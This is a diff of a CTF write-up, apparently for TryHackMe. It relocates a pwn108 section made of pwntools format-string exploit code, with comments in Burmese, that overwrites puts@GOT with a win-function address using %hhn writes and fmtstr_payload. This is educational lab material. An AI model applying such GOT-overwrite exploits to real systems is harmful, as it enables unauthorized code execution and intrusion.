@@ -989,66 +989,7 @@ THM{whY_i_us3d_pr1ntF()_w1thoUt_fmting??}
 
 ---
 
-#### pwn108
 
-
-```python
-from pwn import *
-
-# Addresses to write to
-addr1 = 0x404018        # targets 0x3b
-addr2 = 0x404018 + 1    # targets 0x12
-addr3 = 0x404018 + 2    # targets 0x40
-
-# 1. Format string structure
-# ရှေ့ဆုံးက format string ရဲ့ အရှည်ကို ကြည့်ရအောင်
-# "%59c%10$hhn%215c%11$hhn%46c%12$hhn" = 34 bytes
-fmt = b"%59c%10$hhn%215c%11$hhn%46c%12$hhn"
-
-# 2. Padding (Alignment)
-# x64 မှာ address တွေက 8-byte boundary မှာ ရှိရမယ်
-# 34 ကို 8 နဲ့ စားလို့ ပြတ်အောင် 40 ဖြစ်တဲ့အထိ padding ထည့်မယ် (6 bytes)
-payload = fmt + b"A" * 6
-
-# 3. Adjusting Offsets
-# အပေါ်က payload (40 bytes) ဟာ 8-byte slots ၅ ခု (40/8 = 5) ယူထားတယ်
-# သင်က offset 10 မှာ စတယ်ဆိုရင် ဒီ payload ကြောင့် address တွေက
-# offset 10+5 = 15 နေရာကို ရောက်သွားပါမယ်။
-# ဒါကြောင့် format string ထဲက 10, 11, 12 ကို 15, 16, 17 လို့ ပြင်ပေးရမယ်
-
-final_fmt = b"%59c%15$hhn%215c%16$hhn%46c%17$hhn"
-payload = final_fmt.ljust(40, b"A") # 40 bytes အပြည့်ဖြည့်
-
-# 4. Attach Addresses
-payload += p64(addr1)
-payload += p64(addr2)
-payload += p64(addr3)
-
-# Send payload
-# io.sendline(payload)
-```
-
-
-```c
-def exploit(p):
-    # holiday address (သို့) win function address ကို ရှာပါ
-    # ဥပမာ 0x40123b ဆိုပါစို့
-    win_addr = 0x40123b 
-    target_got = 0x404018 # puts@got
-
-    # Offset 10 ကနေ စစမ်းကြည့်ပါ (GDB မှာ %10$p နဲ့ အရင်စစ်ပါ)
-    # pwn108 မှာ 'Register no : ' စာသားက 12 characters ရှိတာ သတိပြုပါ
-    offset = 10 
-
-    # fmtstr_payload က null byte ပြဿနာနဲ့ alignment ကို အလိုအလျောက် ရှင်းပေးပါတယ်
-    payload = fmtstr_payload(offset, {target_got: win_addr})
-
-    p.sendlineafter(b"name]: ", b"hello")
-    p.sendlineafter(b"Reg No]: ", payload)
-    p.interactive()
-```
-
-----
 
 #### pwn108
 
@@ -1330,6 +1271,65 @@ if __name__ == '__main__':
     io = start()
     exploit(io)
 ```
+
+
+
+```python
+from pwn import *
+
+# Addresses to write to
+addr1 = 0x404018        # targets 0x3b
+addr2 = 0x404018 + 1    # targets 0x12
+addr3 = 0x404018 + 2    # targets 0x40
+
+# 1. Format string structure
+# ရှေ့ဆုံးက format string ရဲ့ အရှည်ကို ကြည့်ရအောင်
+# "%59c%10$hhn%215c%11$hhn%46c%12$hhn" = 34 bytes
+fmt = b"%59c%10$hhn%215c%11$hhn%46c%12$hhn"
+
+# 2. Padding (Alignment)
+# x64 မှာ address တွေက 8-byte boundary မှာ ရှိရမယ်
+# 34 ကို 8 နဲ့ စားလို့ ပြတ်အောင် 40 ဖြစ်တဲ့အထိ padding ထည့်မယ် (6 bytes)
+payload = fmt + b"A" * 6
+
+# 3. Adjusting Offsets
+# အပေါ်က payload (40 bytes) ဟာ 8-byte slots ၅ ခု (40/8 = 5) ယူထားတယ်
+# သင်က offset 10 မှာ စတယ်ဆိုရင် ဒီ payload ကြောင့် address တွေက
+# offset 10+5 = 15 နေရာကို ရောက်သွားပါမယ်။
+# ဒါကြောင့် format string ထဲက 10, 11, 12 ကို 15, 16, 17 လို့ ပြင်ပေးရမယ်
+
+final_fmt = b"%59c%15$hhn%215c%16$hhn%46c%17$hhn"
+payload = final_fmt.ljust(40, b"A") # 40 bytes အပြည့်ဖြည့်
+
+# 4. Attach Addresses
+payload += p64(addr1)
+payload += p64(addr2)
+payload += p64(addr3)
+
+# Send payload
+# io.sendline(payload)
+```
+
+
+```c
+def exploit(p):
+    # holiday address (သို့) win function address ကို ရှာပါ
+    # ဥပမာ 0x40123b ဆိုပါစို့
+    win_addr = 0x40123b 
+    target_got = 0x404018 # puts@got
+
+    # Offset 10 ကနေ စစမ်းကြည့်ပါ (GDB မှာ %10$p နဲ့ အရင်စစ်ပါ)
+    # pwn108 မှာ 'Register no : ' စာသားက 12 characters ရှိတာ သတိပြုပါ
+    offset = 10 
+
+    # fmtstr_payload က null byte ပြဿနာနဲ့ alignment ကို အလိုအလျောက် ရှင်းပေးပါတယ်
+    payload = fmtstr_payload(offset, {target_got: win_addr})
+
+    p.sendlineafter(b"name]: ", b"hello")
+    p.sendlineafter(b"Reg No]: ", payload)
+    p.interactive()
+```
+
 
 ---
 
